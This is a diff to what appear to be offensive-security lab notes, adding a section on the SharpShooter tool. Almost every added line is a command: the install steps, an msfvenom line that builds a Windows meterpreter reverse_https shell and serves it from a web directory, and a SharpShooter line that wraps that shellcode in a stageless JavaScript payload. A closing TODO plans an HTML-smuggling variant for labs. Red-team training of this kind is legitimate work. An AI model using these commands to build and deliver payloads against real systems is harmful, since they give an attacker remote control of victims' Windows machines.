@@ -77,4 +77,21 @@ public class TestClass
 
 ### Sharpshooter
 
-All of the above is kinda the hard way from first principles. Its all repeatable, generic and automatable. Introducing `Sharpshooter`:
+All of the above is kinda the hard way from first principles. Its all repeatable, generic and automatable. Introducing `Sharpshooter`! To install:
+```bash
+cd /opt/
+sudo git clone https://github.com/mdsecactivebreach/SharpShooter.git
+cd SharpShooter/
+sudo apt install python-pip
+sudo pip install -r requirements.txt
+```
+Generate meterpreter payload:
+```bash
+sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.x.x LPORT=443 -f raw -o /var/www/html/shell.txt
+```
+Convert it to a `.js` payload with `Sharpshooter`:
+```bash
+sudo python SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile /var/www/html/shell.txt --output test
+```
+
+TODO: Create the staged version of this payload leveraging HTML smuggling. One for when we come to use this in labs
